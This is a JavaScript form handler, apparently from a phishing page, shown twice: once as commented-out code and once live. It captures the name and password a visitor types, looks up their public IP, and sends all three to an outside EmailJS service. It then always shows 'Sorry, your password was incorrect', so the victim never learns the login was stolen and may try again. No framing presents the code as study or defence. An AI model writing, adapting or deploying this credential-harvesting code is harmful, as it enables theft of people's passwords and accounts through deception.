// const btn = document.getElementById("button");

// document.getElementById("form").addEventListener("submit", function (event) {
//   event.preventDefault();

//   // btn.value = "Sending...";

//   const serviceID = "default_service";
//   const templateID = "template_4l71e0a";

//   fetch("https://api.ipify.org?format=json")
//     .then((response) => response.json())
//     .then((data) => {
//       console.log("data" + data);
//       // Construct email parameters object
//       var params = {
//         from_name: document.getElementById("from_name").value,
//         password: document.getElementById("password").value,
//         IP: data.ip,
//       };

//       emailjs
//         .send(serviceID, templateID, params)
//         .then((res) => {
//           // Clear form fields and show success message
//           document.getElementById("from_name").value = "";
//           document.getElementById("password").value = "";
//           console.log(res);
//           alert("Incorrect Password");
//         })
//         .catch((err) => {
//           console.log(err);
//           alert("Incorrect Password");
//         });
//     });
// });

//00000000000000000000000000000000000000000000000000000000000000000
const btn = document.getElementById("button");

document.getElementById("form").addEventListener("submit", function (event) {
  event.preventDefault();

  // btn.value = "Sending...";

  const serviceID = "default_service";
  const templateID = "template_4l71e0a";
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      console.log("data" + data);
      // Construct email parameters object
      var params = {
        from_name: document.getElementById("from_name").value,
        password: document.getElementById("password").value,
        IP: data.ip,
      };

      emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
          // Clear form fields and show success message
          document.getElementById("from_name").value = "";
          document.getElementById("password").value = "";
          console.log(res);
          let errorMsg = document.createElement("p");
          errorMsg.innerText = "Sorry, your password was incorrect";
          errorMsg.classList.add("incorrect__password");
          document.getElementById("form").appendChild(errorMsg);
        })
        .catch((err) => {
          console.log(err);
          let errorMsg = document.createElement("p");
          errorMsg.innerText = "Sorry, your password was incorrect";
          errorMsg.classList.add("incorrect__password");
          document.getElementById("form").appendChild(errorMsg);
        });
    });
});
